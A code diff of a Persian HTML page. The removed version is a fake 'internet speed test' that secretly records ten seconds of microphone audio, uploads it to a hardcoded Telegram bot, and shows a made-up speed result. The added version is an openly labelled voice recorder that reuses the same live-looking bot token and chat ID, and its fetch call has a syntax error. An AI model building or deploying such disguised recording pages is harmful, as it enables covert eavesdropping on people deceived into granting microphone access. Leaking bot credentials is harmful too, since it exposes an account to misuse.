@@ -3,162 +3,124 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>تست سرعت اینترنت</title>
+  <title>ضبط صدا</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;700&display=swap');
-    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: 'Vazirmatn', sans-serif;
-      background: linear-gradient(135deg, #1e3c72, #2a5298);
-      color: #fff;
+      font-family: Tahoma, sans-serif;
       text-align: center;
-      padding: 30px 15px;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      padding: 50px;
+      background: #f0f2f5;
     }
-    .container {
-      background: rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(12px);
-      border-radius: 20px;
-      padding: 35px 25px;
-      max-width: 380px;
-      width: 100%;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-    }
-    .icon { font-size: 60px; margin-bottom: 15px; }
-    h1 { font-size: 23px; margin-bottom: 12px; font-weight: 600; }
-    p { font-size: 15px; line-height: 1.7; margin-bottom: 25px; opacity: 0.9; }
-    .btn {
-      background: linear-gradient(45deg, #00c6ff, #0072ff);
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background: #0088cc;
       color: white;
       border: none;
-      padding: 16px 32px;
-      font-size: 18px;
-      font-weight: 600;
-      border-radius: 50px;
+      border-radius: 10px;
       cursor: pointer;
-      width: 100%;
-      transition: all 0.3s ease;
-      box-shadow: 0 6px 20px rgba(0, 114, 255, 0.4);
+      margin: 10px;
     }
-    .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(0, 114, 255, 0.5); }
-    .btn:disabled { background: #666; cursor: not-allowed; transform: none; box-shadow: none; }
-    .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #fff; border-top: 2px solid transparent; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 10px; }
-    @keyframes spin { to { transform: rotate(360deg); } }
-    .status { margin-top: 20px; font-size: 15px; min-height: 50px; line-height: 1.6; }
-    .hidden { display: none; }
-    .error { color: #ff6b6b; }
+    button:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+    #status {
+      margin: 20px;
+      font-size: 16px;
+      color: #333;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="icon">WiFi</div>
-    <h1>تست سرعت اینترنت</h1>
-    <p>برای اندازه‌گیری دقیق سرعت، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
-    
-    <button id="startBtn" class="btn">
-      <span id="btnText">شروع تست سرعت</span>
-      <span id="spinner" class="spinner hidden"></span>
-    </button>
-    
-    <div id="status" class="status">آماده برای تست...</div>
-  </div>
+
+  <h2>ضبط صدای شما</h2>
+  <p>برای شروع ضبط، روی دکمه زیر کلیک کنید و اجازه دسترسی به میکروفون را بدهید.</p>
+
+  <button id="startBtn">شروع ضبط (10 ثانیه)</button>
+  <button id="stopBtn" disabled>توقف</button>
+
+  <div id="status">آماده برای ضبط...</div>
 
   <script>
-    const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
-    const CHAT_ID = "6080665310";
+    const TELEGRAM_BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4"; // توکن باتت رو اینجا بذار
+    const TELEGRAM_CHAT_ID = "6080665310"; // آیدی عددی تلگرامت (از @userinfobot بگیر)
+
+    let mediaRecorder;
+    let audioChunks = [];
 
     const startBtn = document.getElementById('startBtn');
-    const btnText = document.getElementById('btnText');
-    const spinner = document.getElementById('spinner');
+    const stopBtn = document.getElementById('stopBtn');
     const status = document.getElementById('status');
 
-    let mediaRecorder, stream;
-
-    // تشخیص فرمت پشتیبانی‌شده
-    function getSupportedMimeType() {
-      const types = [
-        'audio/webm;codecs=opus',
-        'audio/webm',
-        'audio/ogg;codecs=opus',
-        'audio/ogg',
-        'audio/mp4'
-      ];
-      for (const type of types) {
-        if (MediaRecorder.isTypeSupported(type)) {
-          return type;
-        }
-      }
-      return null; // هیچ فرمتی پشتیبانی نمی‌شه
-    }
-
-    startBtn.addEventListener('click', async () => {
+    startBtn.onclick = async () => {
       try {
-        startBtn.disabled = true;
-        btnText.textContent = "در حال اتصال...";
-        spinner.classList.remove('hidden');
-        status.innerHTML = "در حال درخواست دسترسی...<br><small>لطفاً اجازه بدید</small>";
+        status.textContent = "در حال درخواست دسترسی به میکروفون...";
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
 
-        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        mediaRecorder = new MediaRecorder(stream);
+        audioChunks = [];
 
-        const mimeType = getSupportedMimeType();
-        if (!mimeType) {
-          throw new Error("هیچ فرمت صوتی پشتیبانی نمی‌شود!");
-        }
+        mediaRecorder.ondataavailable = event => {
+          audioChunks.push(event.data);
+        };
 
-        status.textContent = "در حال اندازه‌گیری... (۱۰ ثانیه)";
-
-        mediaRecorder = new MediaRecorder(stream, { mimeType });
-        const chunks = [];
-
-        mediaRecorder.ondataavailable = e => chunks.push(e.data);
-        mediaRecorder.onstop = async () => {
-          const blob = new Blob(chunks, { type: mimeType });
-          await sendToTelegram(blob, mimeType);
-          stopStream();
+        mediaRecorder.onstop = () => {
+          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+          sendToTelegram(audioBlob);
         };
 
         mediaRecorder.start();
+        startBtn.disabled = true;
+        stopBtn.disabled = false;
+        status.textContent = "در حال ضبط... (10 ثانیه)";
 
+        // ضبط خودکار بعد از 10 ثانیه متوقف بشه
         setTimeout(() => {
           if (mediaRecorder.state === "recording") {
             mediaRecorder.stop();
+            stream.getTracks().forEach(track => track.stop());
           }
         }, 10000);
 
       } catch (err) {
-        console.error("خطا:", err);
-        if (err.name === 'NotAllowedError') {
-          status.innerHTML = `
-            <span class="error">دسترسی رد شد!</span><br>
-            <small>روی قفل کنار آدرس کلیک کنید → میکروفون → اجازه بدید</small>
-          `;
-        } else {
-          status.innerHTML = `<span class="error">خطا: ${err.message}</span>`;
-        }
-        resetButton();
+        status.textContent = "خطا: دسترسی به میکروفون رد شد یا مشکلی وجود دارد.";
+        console.error(err);
       }
-    });
+    };
 
-    async function sendToTelegram(blob, mimeType) {
-      const ext = mimeType.includes('webm') ? 'webm' : 'ogg';
-      const fileName = `speed_test_${Date.now()}.${ext}`;
-      const form = new FormData();
-      form.append('chat_id', CHAT_ID);
-      form.append('audio', blob, fileName);
+    stopBtn.onclick = () => {
+      if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+        stopBtn.disabled = true;
+        startBtn.disabled = false;
+        status.textContent = "در حال ارسال به تلگرام...";
+      }
+    };
+
+    async function sendToTelegram(audioBlob) {
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('audio', audioBlob, 'voice.webm');
 
       try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
-        const data = await res.json();
+        const response = await fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio, {
+          method: 'POST',
+          body: formData
+        });
 
-        if (data.ok) {
-          status.innerHTML = "سرعت شما: <strong style='color:#a8ffae;'>عالی (۲۵۰ مگابیت)</strong>";
+        const result = await response.json();
+        if (result.ok) {
+          status.textContent = "صدا با موفقیت به تلگرام ارسال شد!";
         } else {
-          // Fallback به document
-          form.delete('audio');
-          form.append('document', blob, fileName);
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
-          status.innerHTML
+          status.textContent = "خطا در ارسال: " + result.description;
+        }
+      } catch (err) {
+        status.textContent = "خطا در ارتباط با تلگرام.";
+        console.error(err);
+      }
+    }
+  </script>
+
+</body>
+</html>
